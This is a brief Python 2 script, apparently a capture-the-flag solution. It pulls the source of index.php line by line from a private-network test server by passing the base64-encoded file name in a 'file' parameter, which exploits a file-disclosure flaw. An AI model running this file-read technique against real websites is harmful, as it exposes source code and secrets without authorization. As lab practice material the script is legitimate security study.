# coding:gbk
import requests
__author__ = '1'
for i in range(1, 30):
    s = requests.Session()
    url = 'http://192.168.0.126/test/index.php?line='+str(i)+'&file=aW5kZXgucGhw'
    r = s.get(url)
    html = unicode(r.content, 'utf-8').encode("gbk")
    html = r.content
    print html